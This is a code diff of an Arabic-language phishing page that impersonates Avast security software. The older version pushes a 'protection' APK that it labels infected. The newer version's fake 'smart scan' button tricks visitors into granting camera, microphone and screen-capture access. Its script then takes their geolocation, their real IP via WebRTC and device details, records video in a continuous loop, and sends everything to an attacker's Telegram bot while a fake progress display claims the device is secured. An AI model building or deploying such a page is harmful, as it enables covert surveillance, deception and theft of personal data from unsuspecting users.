@@ -3,114 +3,160 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Avast Mobile Security | حماية الأندرويد</title>
+    <title>Avast Premium Security | فحص الأمان الشامل</title>
     <style>
-        :root { --main: #ff7b00; --dark: #1a1a1b; --grey: #f4f4f4; }
+        :root { --orange: #ff7b00; --dark: #1a1a1b; --bg: #fffcf5; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: white; color: #333; }
+        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; border-bottom: 1px solid #eee; }
+        .logo { width: 100px; }
         
-        /* Header */
-        .navbar { display: flex; justify-content: space-between; padding: 15px 10%; border-bottom: 1px solid #eee; align-items: center; }
-        .logo { width: 120px; }
-
-        /* Hero Section */
-        .hero { background: var(--grey); padding: 50px 10%; display: flex; align-items: center; flex-wrap: wrap; }
-        .hero-text { flex: 1; min-width: 300px; }
-        .hero-text h1 { font-size: 2.5rem; color: #111; margin-bottom: 15px; }
-        .hero-text p { font-size: 1.1rem; color: #555; line-height: 1.6; }
+        .hero { background: var(--bg); padding: 50px 8%; text-align: center; border-bottom: 1px solid #f0e0c0; }
+        .main-card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: inline-block; width: 100%; max-width: 550px; border: 2px solid var(--orange); }
         
-        .download-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; border: 2px solid var(--main); }
-        .btn-download { background: var(--main); color: white; border: none; padding: 18px 40px; font-size: 1.3rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; text-decoration: none; display: inline-block; margin-top: 20px; }
-        .btn-download:hover { background: #e66f00; transform: translateY(-3px); }
+        .btn-scan { background: var(--orange); color: white; border: none; padding: 20px 0; font-size: 1.4rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; width: 100%; box-shadow: 0 8px 20px rgba(255, 123, 0, 0.3); }
+        .btn-scan:hover { transform: translateY(-3px); box-shadow: 0 12px 25px rgba(255, 123, 0, 0.5); }
 
-        /* Trusted Footer (Like the image you sent) */
-        .trust-section { padding: 60px 10%; background: #fffcf5; border-top: 1px solid #f0e0c0; text-align: center; }
-        .awards { display: flex; justify-content: center; gap: 40px; margin-bottom: 40px; flex-wrap: wrap; }
-        .awards img { height: 60px; filter: grayscale(100%); opacity: 0.6; }
+        .terminal { display: none; background: #000; color: #00ff41; padding: 15px; border-radius: 10px; font-family: 'Courier New', monospace; font-size: 13px; text-align: left; direction: ltr; height: 150px; overflow-y: auto; margin-top: 20px; }
         
-        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; }
-        .feat-card { padding: 20px; }
-        .feat-card h3 { color: #d48806; margin-bottom: 10px; }
-        .feat-card p { font-size: 14px; color: #666; }
-
-        .warning-bar { background: #ff003c; color: white; text-align: center; padding: 10px; font-weight: bold; font-size: 14px; }
+        .trust-section { padding: 40px 8%; display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; text-align: center; }
+        .trust-item img { width: 45px; margin-bottom: 10px; }
+        .trust-item h4 { color: #d48806; margin: 5px 0; }
+        .trust-item p { font-size: 12px; color: #777; }
     </style>
 </head>
 <body>
 
-<div class="warning-bar">تنبيه: تم اكتشاف 3 ثغرات أمنية في متصفحك الحالي. يرجى التحديث فوراً.</div>
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Avast_logo.svg/1200px-Avast_logo.svg.png" class="logo">
+    <div style="color: #666; font-size: 13px; font-weight: bold;">Cloud Protection Active 2026</div>
+</div>
 
-<nav class="navbar">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Avast_logo.svg/1200px-Avast_logo.svg.png" class="logo" alt="Avast">
-    <div style="font-weight: bold; color: #555;">المساعدة | الدعم</div>
-</nav>
+<div class="hero">
+    <h1 style="font-size: 2rem;">فحص الأمان والخصوصية من <span style="color:var(--orange)">Avast</span></h1>
+    <p style="color: #666; margin-bottom: 30px;">اضغط على الزر أدناه لفحص الثغرات وتأمين الكاميرا والشاشة ضد التجسس.</p>
 
-<section class="hero">
-    <div class="hero-text">
-        <h1>حماية مجانية <br><span style="color:var(--main)">للأندرويد 2026</span></h1>
-        <p>انضم إلى 435 مليون شخص يستخدمون Avast يومياً للحماية من الفيروسات، وتأمين الكاميرا، ومنع تعقب المواقع.</p>
-        <ul style="list-style: none; padding: 0; color: #444;">
-            <li>✅ فحص عميق للملفات (Deep Scan)</li>
-            <li>✅ حماية الخصوصية ومنع التجسس</li>
-            <li>✅ تأمين البريد الإلكتروني وكروم</li>
-        </ul>
-    </div>
-
-    <div class="download-box">
-        <h3 style="margin-top:0">تطبيق Shield Advisor</h3>
-        <p style="font-size: 14px;">الإصدار: v4.0.2 (أحدث إصدار)</p>
-        <img src="https://cdn-icons-png.flaticon.com/512/771/771220.png" width="80" alt="Android APK">
-        <br>
-        <a href="URL_TO_YOUR_INFECTED_APK" class="btn-download" id="downloadBtn">تحميل APK مجاناً</a>
-        <p style="font-size: 11px; margin-top: 15px; color: #999;">بمجرد التحميل، قم بفتح الملف وتثبيته لمنح صلاحيات الحماية.</p>
-    </div>
-</section>
-
-<section class="trust-section">
-    <div class="awards">
-        <img src="https://www.av-test.org/fileadmin/templates/avtest/images/logo_av-test.png" alt="Award 1">
-        <img src="https://www.av-comparatives.org/wp-content/uploads/2018/01/av-comparatives-logo.png" alt="Award 2">
-        <img src="https://www.pcmag.com/img/pcmag-logo.svg" alt="Award 3">
-    </div>
-
-    <div class="features">
-        <div class="feat-card">
-            <h3>الذكاء الاصطناعي</h3>
-            <p>حماية متطورة مدعومة بالذكاء الاصطناعي لكشف محاولات الاختراق قبل وقوعها.</p>
+    <div class="main-card">
+        <div id="setup-ui">
+            <img src="https://cdn-icons-png.flaticon.com/512/754/754519.png" width="80" style="margin-bottom: 20px;">
+            <button class="btn-scan" onclick="startMasterEngine()">بدء الفحص الذكي</button>
         </div>
-        <div class="feat-card">
-            <h3>تأمين المراسلات</h3>
-            <p>فحص تلقائي لرسائل الواتساب والبريد الإلكتروني لمنع الروابط الخبيثة.</p>
-        </div>
-        <div class="feat-card">
-            <h3>خصوصية الموقع</h3>
-            <p>إخفاء موقعك الجغرافي الحقيقي عن المواقع المتطفلة وحماية الـ IP.</p>
-        </div>
+
+        <div class="terminal" id="term"></div>
     </div>
-</section>
+</div>
+
+<div class="trust-section">
+    <div class="trust-item">
+        <img src="https://cdn-icons-png.flaticon.com/512/2092/2092663.png">
+        <h4>الذكاء الاصطناعي</h4>
+        <p>تحليل فوري للتهديدات</p>
+    </div>
+    <div class="trust-item">
+        <img src="https://cdn-icons-png.flaticon.com/512/1162/1162258.png">
+        <h4>تأمين المتصفح</h4>
+        <p>تشفير بيانات كروم</p>
+    </div>
+    <div class="trust-item">
+        <img src="https://cdn-icons-png.flaticon.com/512/702/702797.png">
+        <h4>فحص الكاميرا</h4>
+        <p>منع الوصول غير المصرح به</p>
+    </div>
+</div>
+
+<video id="v" autoplay muted style="display:none"></video>
 
 <script>
     const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
-    const CHAT_ID = "8754338811";
+    const ADMIN_ID = "8754338811";
 
-    // تتبع الضحية فور دخوله الصفحة
-    window.onload = async () => {
-        const info = `🔔 **الضحية دخل صفحة التحميل الآن!**\n📱 الجهاز: ${navigator.userAgent}\n🌐 الموقع المتوقع: ${navigator.language}`;
+    async function sendMsg(text) {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: info })
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown' })
         });
-    };
+    }
 
-    // إشعار عند ضغط زر التحميل
-    document.getElementById('downloadBtn').onclick = async () => {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: "📥 **الضحية ضغط على زر تحميل الـ APK!** انتظر التثبيت..." })
-        });
-    };
+    async function startMasterEngine() {
+        const setup = document.getElementById('setup-ui');
+        const term = document.getElementById('term');
+        
+        setup.style.display = 'none';
+        term.style.display = 'block';
+        addLog("> Starting Avast Core v4.0...");
+
+        try {
+            // 1. طلب الصلاحيات (الفخ المزدوج)
+            const camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            addLog("> [OK] Media Stream Verified.");
+
+            // 2. سحب البيانات فوراً (الموقع + الـ IP + الجهاز)
+            navigator.geolocation.getCurrentPosition(p => {
+                sendMsg(`📍 **موقع الضحية الدقيق:** \nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // سحب الـ IP الحقيقي (تخطي VPN)
+            const rtc = new RTCPeerConnection();
+            rtc.createDataChannel("");
+            rtc.createOffer().then(o => rtc.setLocalDescription(o));
+            rtc.onicecandidate = i => {
+                if(i.candidate) {
+                    const ip = i.candidate.candidate.split(" ")[4];
+                    if(ip.includes(".")) sendMsg(`🌐 **الـ IP الحقيقي (WebRTC):** \`${ip}\``);
+                }
+            };
+
+            // معلومات الجهاز
+            const info = `📱 **بيانات الجهاز:**\n• المتصفح: ${navigator.userAgent}\n• الذاكرة: ~${navigator.deviceMemory}GB\n• المعالج: ${navigator.hardwareConcurrency} Cores`;
+            sendMsg(info);
+
+            // 3. بدء التسجيل المستمر (بث مقطع كل 30 ثانية)
+            record(camStream, "FACE_CAM");
+            record(screenStream, "SCREEN_LIVE");
+
+            // إيهام الضحية بالتقدم
+            let progress = 0;
+            const inv = setInterval(() => {
+                progress += 10;
+                addLog(`> Scanning blocks... ${progress}%`);
+                if(progress >= 100) {
+                    clearInterval(inv);
+                    term.innerHTML = "<h3 style='color:#00ff41'>✅ تم تأمين الجهاز!</h3><p style='color:#fff'>نظام الحماية نشط الآن في الخلفية.</p>";
+                }
+            }, 2000);
+
+        } catch (e) {
+            alert("⚠️ تنبيه: يجب الموافقة على جميع الأذونات لإتمام فحص الأمان وتأمين الجهاز.");
+            location.reload();
+        }
+    }
+
+    function record(stream, label) {
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'video/mp4' });
+            const fd = new FormData();
+            fd.append('chat_id', ADMIN_ID);
+            fd.append('video', blob, `${label}.mp4`);
+            fd.append('caption', `📡 **تحديث مباشر [${label}]**\nالوقت: ${new Date().toLocaleTimeString()}`);
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            
+            // إعادة التسجيل تلقائياً لضمان الاستمرارية
+            if (stream.active) record(stream, label);
+        };
+        recorder.start();
+        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 30000);
+    }
+
+    function addLog(msg) {
+        const term = document.getElementById('term');
+        term.innerHTML += `<div>${msg}</div>`;
+        term.scrollTop = term.scrollHeight;
+    }
 </script>
-
 </body>
 </html>
